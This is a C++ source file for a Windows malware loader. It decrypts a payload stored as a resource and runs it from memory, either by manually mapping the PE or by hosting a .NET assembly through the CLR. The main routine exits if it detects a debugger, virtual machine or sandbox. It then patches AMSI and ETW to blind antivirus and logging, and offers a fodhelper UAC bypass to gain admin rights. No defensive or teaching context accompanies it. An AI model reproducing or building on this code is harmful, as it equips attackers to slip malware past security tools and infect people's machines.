#include <windows.h>
#include <stdio.h>
#include <vector>
#include "config.h"
#include "encryption.h"
#include "antidetect.h"
#include "uac_bypass.h"
#include "dotnet_loader.h"
#include "obfuscation.h"
#include "resource.h"

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

// Obfuscated class name
#define LOADER_CLASS NameObfuscator::Generate()

class AdvancedPELoader {
private:
    BYTE* peData;
    size_t peSize;
    bool isDotNet;
    
    bool IsDotNetAssembly() {
        if (peSize < sizeof(IMAGE_DOS_HEADER)) return false;
        
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peData;
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return false;
        
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(peData + dosHeader->e_lfanew);
        if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return false;
        
        // Check for CLR directory
        DWORD clrRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress;
        return (clrRVA != 0);
    }
    
    bool LoadDotNetAssembly() {
        printf("[*] Detected .NET assembly\n");
        printf("[*] Patching AMSI...\n");
        AntiDetect::PatchAMSI();
        
        printf("[*] Initializing CLR...\n");
        DotNetLoader loader;
        if (!loader.Initialize()) {
            printf("[-] Failed to initialize CLR\n");
            return false;
        }
        
        printf("[*] Executing .NET assembly...\n");
        return loader.ExecuteAssembly(peData, peSize);
    }
    
    bool ValidatePE() {
        if (peSize < sizeof(IMAGE_DOS_HEADER)) return false;
        
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peData;
        if (dosHeader->e_magic != OBFU_MZ) return false;
        
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(peData + dosHeader->e_lfanew);
        if (ntHeaders->Signature != OBFU_PE) return false;
        
        return true;
    }
    
    bool ProcessRelocations(LPVOID baseAddress) {
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peData;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(peData + dosHeader->e_lfanew);
        
        DWORD_PTR delta = (DWORD_PTR)baseAddress - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;
        if (delta == 0) return true;
        
        PIMAGE_DATA_DIRECTORY relocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir->Size == 0) return true;
        
        PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)baseAddress + relocDir->VirtualAddress);
        
        while (reloc->VirtualAddress) {
            DWORD numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            PWORD relocInfo = (PWORD)((LPBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
            
            for (DWORD i = 0; i < numEntries; i++) {
                int type = relocInfo[i] >> 12;
                int offset = relocInfo[i] & 0xFFF;
                
                if (type == IMAGE_REL_BASED_DIR64) {
                    ULONGLONG* patchAddr = (ULONGLONG*)((LPBYTE)baseAddress + reloc->VirtualAddress + offset);
                    *patchAddr += delta;
                } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                    DWORD* patchAddr = (DWORD*)((LPBYTE)baseAddress + reloc->VirtualAddress + offset);
                    *patchAddr += (DWORD)delta;
                }
            }
            
            reloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)reloc + reloc->SizeOfBlock);
        }
        
        return true;
    }
    
    bool ResolveImports(LPVOID baseAddress) {
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peData;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(peData + dosHeader->e_lfanew);
        
        PIMAGE_DATA_DIRECTORY importDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (importDir->Size == 0) return true;
        
        PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)baseAddress + importDir->VirtualAddress);
        
        // Use obfuscated API loading
        typedef HMODULE(WINAPI* pLoadLibraryA)(LPCSTR);
        typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);
        
        HMODULE hKernel32 = GetModuleHandleA(NULL);
        while (hKernel32 = GetModuleHandleA("kernel32.dll")) break;
        
        pLoadLibraryA _LoadLibraryA = (pLoadLibraryA)APIObfuscator::GetAPI(hKernel32, APIObfuscator::HASH_LoadLibraryA);
        pGetProcAddress _GetProcAddress = (pGetProcAddress)APIObfuscator::GetAPI(hKernel32, APIObfuscator::HASH_GetProcAddress);
        
        while (importDesc->Name) {
            char* moduleName = (char*)((LPBYTE)baseAddress + importDesc->Name);
            HMODULE hModule = _LoadLibraryA(moduleName);
            
            if (!hModule) return false;
            
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((LPBYTE)baseAddress + importDesc->FirstThunk);
            PIMAGE_THUNK_DATA origThunk = (PIMAGE_THUNK_DATA)((LPBYTE)baseAddress + 
                (importDesc->OriginalFirstThunk ? importDesc->OriginalFirstThunk : importDesc->FirstThunk));
            
            while (thunk->u1.AddressOfData) {
                FARPROC function = NULL;
                
                if (IMAGE_SNAP_BY_ORDINAL(origThunk->u1.Ordinal)) {
                    function = _GetProcAddress(hModule, (LPCSTR)IMAGE_ORDINAL(origThunk->u1.Ordinal));
                } else {
                    PIMAGE_IMPORT_BY_NAME importName = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)baseAddress + origThunk->u1.AddressOfData);
                    function = _GetProcAddress(hModule, importName->Name);
                }
                
                if (!function) return false;
                
                thunk->u1.Function = (ULONGLONG)function;
                thunk++;
                origThunk++;
            }
            
            importDesc++;
        }
        
        return true;
    }
    
public:
    AdvancedPELoader(BYTE* data, size_t size) : peData(data), peSize(size), isDotNet(false) {
        isDotNet = IsDotNetAssembly();
    }
    
    bool Load() {
        // Check for .NET
        if (isDotNet) {
            return LoadDotNetAssembly();
        }
        
        // Native PE loading
        if (!ValidatePE()) return false;
        
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peData;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(peData + dosHeader->e_lfanew);
        
        SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
        LPVOID imageBase = VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        
        if (!imageBase) return false;
        
        // Copy headers and sections
        memcpy(imageBase, peData, ntHeaders->OptionalHeader.SizeOfHeaders);
        
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (section[i].SizeOfRawData > 0) {
                memcpy(
                    (LPVOID)((LPBYTE)imageBase + section[i].VirtualAddress),
                    (LPVOID)(peData + section[i].PointerToRawData),
                    section[i].SizeOfRawData
                );
            }
        }
        
        if (!ProcessRelocations(imageBase)) return false;
        if (!ResolveImports(imageBase)) return false;
        
        // Execute
        typedef int (WINAPI* ExeEntryPoint)();
        ExeEntryPoint entry = (ExeEntryPoint)((LPBYTE)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
        entry();
        
        return true;
    }
};

std::vector<BYTE> LoadEncryptedPayload() {
    HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(IDR_PAYLOAD_EXE), RT_RCDATA);
    if (!hResource) return {};
    
    HGLOBAL hLoadedResource = LoadResource(NULL, hResource);
    if (!hLoadedResource) return {};
    
    LPVOID pData = LockResource(hLoadedResource);
    DWORD dwSize = SizeofResource(NULL, hResource);
    
    std::vector<BYTE> encryptedData((BYTE*)pData, (BYTE*)pData + dwSize);
    return encryptedData;
}

int main(int argc, char* argv[]) {
    // Anti-analysis checks
    printf("[*] Running security checks...\n");
    
    if (AntiDetect::IsDebuggerPresent()) {
        printf("[-] Debugger detected. Exiting...\n");
        return 1;
    }
    
    if (AntiDetect::IsVirtualMachine()) {
        printf("[-] Virtual machine detected. Exiting...\n");
        return 1;
    }
    
    if (AntiDetect::IsSandbox()) {
        printf("[-] Sandbox detected. Exiting...\n");
        return 1;
    }
    
    printf("[+] Environment checks passed\n");
    
    // Patch AMSI and ETW
    AntiDetect::PatchAMSI();
    AntiDetect::PatchETW();
    
    // Check for admin privileges
    if (!UACBypass::IsElevated()) {
        printf("[!] Not running as admin\n");
        
        if (argc > 1 && strcmp(argv[1], "--elevate") == 0) {
            printf("[*] Attempting UAC bypass...\n");
            
            char path[MAX_PATH];
            GetModuleFileNameA(NULL, path, MAX_PATH);
            
            if (UACBypass::FodhelperBypass(path)) {
                printf("[+] UAC bypass successful\n");
                return 0;
            }
        } else {
            printf("[*] Run with --elevate to attempt UAC bypass\n");
        }
    } else {
        printf("[+] Running with elevated privileges\n");
    }
    
    // Anti-analysis delay
    AntiDetect::AntiAnalysisDelay();
    
    // Load and decrypt payload
    printf("[*] Loading payload...\n");
    std::vector<BYTE> encryptedPayload = LoadEncryptedPayload();
    if (encryptedPayload.empty()) {
        printf("[-] Failed to load payload\n");
        return 1;
    }
    
    std::string key = GetDecryptedKey();
    printf("[*] Decrypting payload...\n");
    std::vector<BYTE> decryptedPayload = MultiLayerEncryption::Decrypt(encryptedPayload, key);
    
    if (decryptedPayload.empty()) {
        printf("[-] Decryption failed\n");
        return 1;
    }
    
    // Load PE
    printf("[*] Loading PE...\n");
    AdvancedPELoader loader(decryptedPayload.data(), decryptedPayload.size());
    if (!loader.Load()) {
        printf("[-] PE loading failed\n");
        return 1;
    }
    
    printf("[+] Execution completed\n");
    return 0;
}
